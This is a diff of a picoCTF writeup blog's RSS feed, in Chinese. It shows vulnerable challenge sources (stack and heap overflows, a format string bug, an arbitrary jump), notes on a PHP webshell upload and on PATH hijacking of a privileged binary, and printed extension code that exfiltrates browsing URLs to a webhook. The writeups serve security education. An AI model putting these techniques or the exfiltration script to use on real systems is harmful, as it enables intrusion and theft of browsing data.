@@ -12,7 +12,7 @@
     
     <copyright>本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！</copyright>
     
-    <lastBuildDate>Mon, 10 Aug 2026 10:30:52 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 17 Sep 2026 11:30:52 +0800</lastBuildDate>
     
     
     <atom:link href="http://localhost:1313/tags/writeup/index.xml" rel="self" type="application/rss&#43;xml" />
@@ -22,59 +22,28 @@
     
 
     <item>
-      <title>Echo Escape 1</title>
-      <link>http://localhost:1313/post/echo_escape_1/</link>
-      <pubDate>Mon, 10 Aug 2026 10:08:52 &#43;0800</pubDate>
+      <title>n0s4n1ty 1</title>
+      <link>http://localhost:1313/post/n0s4n1ty_1/</link>
+      <pubDate>Thu, 17 Sep 2026 10:30:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/echo_escape_1/</guid>
+      <guid>http://localhost:1313/post/n0s4n1ty_1/</guid>
       <description>
-        <![CDATA[<h1>Echo Escape 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>n0s4n1ty 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="原始碼">
-<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[!] Failed to open flag.txt&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">n</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the secure echo service!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please enter your name: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Thank you for using our service.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="解題">
+          <h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
-</h2><h3 id="解題思路">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
-解題思路
-</h3><p>利用read(0, buf, 128)的oevrflow 跳到win function 取得flag</p>
+</h2><h3 id="開啟並觀察題目網頁">
+<a class="header-anchor" href="#%e9%96%8b%e5%95%9f%e4%b8%a6%e8%a7%80%e5%af%9f%e9%a1%8c%e7%9b%ae%e7%b6%b2%e9%a0%81"></a>
+開啟並觀察題目網頁
+</h3><p>發現題目後端系統是由php寫的,並且有一個上傳的功能
+<img src="/images/n0s4n1ty_1/1.webp" alt="image"></p>
+<h3 id="嘗試編寫一句話木馬並上傳">
+<a class="header-anchor" href="#%e5%98%97%e8%a9%a6%e7%b7%a8%e5%af%ab%e4%b8%80%e5%8f%a5%e8%a9%b1%e6%9c%a8%e9%a6%ac%e4%b8%a6%e4%b8%8a%e5%82%b3"></a>
+嘗試編寫一句話木馬並上傳
+</h3><p>創建一個cmd.php的文件,寫入一句話木馬</p>
         
-        <hr><p>本文2026-08-10首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-10</p>]]>
+        <hr><p>本文2026-09-17首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-09-17</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -84,42 +53,18 @@
     
 
     <item>
-      <title>format string 0</title>
-      <link>http://localhost:1313/post/format_string_0/</link>
-      <pubDate>Sun, 09 Aug 2026 17:08:52 &#43;0800</pubDate>
+      <title>heap 1</title>
+      <link>http://localhost:1313/post/heap_1/</link>
+      <pubDate>Tue, 01 Sep 2026 20:41:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/format_string_0/</guid>
+      <guid>http://localhost:1313/post/heap_1/</guid>
       <description>
-        <![CDATA[<h1>format string 0</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>heap 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="what-is-format-string-vulnerability格式化字串漏洞">
-<a class="header-anchor" href="#what-is-format-string-vulnerability%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e4%b8%b2%e6%bc%8f%e6%b4%9e"></a>
-What is Format String Vulnerability（格式化字串漏洞）?
-</h2><p>Format String Vulnerability（格式化字串漏洞） 是一種常見於 C/C++ 程式的漏洞，通常發生在程式把「使用者輸入」直接丟給 printf()、fprintf()、sprintf() 這類格式化輸出函式。<br>
-例如printf危險的寫法是</p>
-        
-        <hr><p>本文2026-08-09首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-09</p>]]>
-      </description>
-      
-        <category>Picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>heap 0 writeup</title>
-      <link>http://localhost:1313/post/heap_0/</link>
-      <pubDate>Sun, 09 Aug 2026 16:33:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/heap_0/</guid>
-      <description>
-        <![CDATA[<h1>heap 0 writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="原始碼">
-<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+          <h2 id="題目原始碼">
+<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+題目原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
@@ -134,7 +79,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">input_data</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_win</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">safe_var</span><span class="p">,</span> <span class="s">&#34;bico&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">safe_var</span><span class="p">,</span> <span class="s">&#34;pico&#34;</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">YOU WIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// Print flag
@@ -142,8 +87,8 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">FLAGSIZE_MAX</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span><span class="c1">//強制輸出到螢幕
-</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Looks like everything is still secure!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
@@ -165,7 +110,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Welcome to heap0!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Welcome to heap1!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;I put my data on the heap so it should be safe from any tampering.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
@@ -206,18 +151,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">print_menu</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">rval</span> <span class="o">=</span> <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">rval</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">	    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rval</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="c1">//printf(&#34;Invalid input. Please enter a valid choice.\n&#34;);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//fflush(stdout);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">// Clear input buffer
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//while (getchar() != &#39;\n&#39;);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//continue;
-</span></span></span><span class="line"><span class="cl">	    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
@@ -252,9 +186,9 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>利用選項 1 列出 2個heap位置,利用選項2 用heap overflow 從 input_data 寫入,將 safe_var 的 字串改掉,再選項 4 呼叫 check_win() ,印出flag</p>
+</h3><p>印出heap位置,計算offset,利用heap overflow滿足win function條件</p>
         
-        <hr><p>本文2026-08-09首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-09</p>]]>
+        <hr><p>本文2026-09-01首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-09-01</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -264,13 +198,135 @@ What is Format String Vulnerability（格式化字串漏洞）?
     
 
     <item>
-      <title>PIE TIME writeup</title>
-      <link>http://localhost:1313/post/pie_time/</link>
-      <pubDate>Fri, 03 Jul 2026 20:33:52 &#43;0800</pubDate>
+      <title>hash-only-2</title>
+      <link>http://localhost:1313/post/hash-only-2/</link>
+      <pubDate>Mon, 31 Aug 2026 10:37:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/pie_time/</guid>
+      <guid>http://localhost:1313/post/hash-only-2/</guid>
       <description>
-        <![CDATA[<h1>PIE TIME writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>hash-only-2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="連線題目">
+<a class="header-anchor" href="#%e9%80%a3%e7%b7%9a%e9%a1%8c%e7%9b%ae"></a>
+連線題目
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">ssh ctf-player@rescued-float.picoctf.net -p <span class="m">58909</span>
+</span></span><span class="line"><span class="cl">3f39b042 
+</span></span></code></pre></div><p><img src="/images/hash-only-2/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>接上一題,我們這次在rbash的環境執行,我們要繞過他的保護機制製作假的md5sum,並更改PATH或放入到PATH中,使程式執行我們製作的偽造指令</p>
+        
+        <hr><p>本文2026-08-31首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-31</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>hash-only-1</title>
+      <link>http://localhost:1313/post/hash-only-1/</link>
+      <pubDate>Fri, 28 Aug 2026 17:00:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/hash-only-1/</guid>
+      <description>
+        <![CDATA[<h1>hash-only-1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="下載題目">
+<a class="header-anchor" href="#%e4%b8%8b%e8%bc%89%e9%a1%8c%e7%9b%ae"></a>
+下載題目
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">scp -P <span class="m">56774</span> ctf-player@shape-facility.picoctf.net:~/flaghasher ./
+</span></span></code></pre></div><h2 id="用ida簡單逆向程式">
+<a class="header-anchor" href="#%e7%94%a8ida%e7%b0%a1%e5%96%ae%e9%80%86%e5%90%91%e7%a8%8b%e5%bc%8f"></a>
+用IDA簡單逆向程式
+</h2><p><img src="/images/hash-only-1/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>發現程式使用特殊權限執行,且其中用到md5sum指令卻沒指明絕對路徑,可以製作假的md5sum,並更改PATH,使程式執行我們製作的偽造指令</p>
+        
+        <hr><p>本文2026-08-28首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-28</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>The Add/On Trap writeup</title>
+      <link>http://localhost:1313/post/the_add_on_trap/</link>
+      <pubDate>Tue, 25 Aug 2026 14:54:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/the_add_on_trap/</guid>
+      <description>
+        <![CDATA[<h1>The Add/On Trap writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="解壓縮題目給的xpi檔">
+<a class="header-anchor" href="#%e8%a7%a3%e5%a3%93%e7%b8%ae%e9%a1%8c%e7%9b%ae%e7%b5%a6%e7%9a%84xpi%e6%aa%94"></a>
+解壓縮題目給的.xpi檔
+</h2><p><img src="/images/The_Add_On_Trap/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><p>查看每一個檔案,在background/main.js中發現可疑的程式碼</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Secret</span> <span class="n">key</span> <span class="n">must</span> <span class="n">be</span> <span class="mi">32</span> <span class="n">url</span><span class="o">-</span><span class="n">safe</span> <span class="n">base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">bytes</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">TODO</span> <span class="n">I</span> <span class="n">must</span> <span class="n">find</span> <span class="n">a</span> <span class="n">solution</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">the</span> <span class="n">key</span> <span class="n">from</span> <span class="n">here</span><span class="p">,</span> <span class="k">for</span> <span class="n">now</span> <span class="n">I</span><span class="s1">&#39;ll leave it there because I need it to encrypt the webhook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">logOnCompleted</span><span class="p">(</span><span class="n">details</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Information</span> <span class="n">to</span> <span class="n">exfiltrate</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">webhookUrl</span><span class="o">=</span><span class="s1">&#39;gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span><span class="p">:</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fetch</span><span class="p">(</span><span class="n">webhookUrl</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span><span class="p">:</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">204</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="err">`</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">extraction</span><span class="o">!</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">browser</span><span class="o">.</span><span class="n">webNavigation</span><span class="o">.</span><span class="n">onCompleted</span><span class="o">.</span><span class="n">addListener</span><span class="p">(</span><span class="n">logOnCompleted</span><span class="p">);</span>
+</span></span></code></pre></div><p>其中<code>const key=&quot;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&quot;</code>明顯是base64加密,我們把它進行解密
+<img src="/images/The_Add_On_Trap/2.webp" alt="image">
+取得了一個假的flag</p>
+        
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>PIE TIME 2</title>
+      <link>http://localhost:1313/post/pie_time_2/</link>
+      <pubDate>Tue, 25 Aug 2026 00:48:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/pie_time_2/</guid>
+      <description>
+        <![CDATA[<h1>PIE TIME 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
           <h2 id="原始碼">
 <a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
@@ -283,6 +339,20 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">segfault_handler</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Segfault Occurred, incorrect address.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">call_functions</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your name:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; enter the address to jump to, ex =&gt; 0x12345: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">foo</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">val</span><span class="p">;</span><span class="c1">//函式指標，並把 val 強制轉型成函式指標存進去。
+</span></span></span><span class="line"><span class="cl">  <span class="nf">foo</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
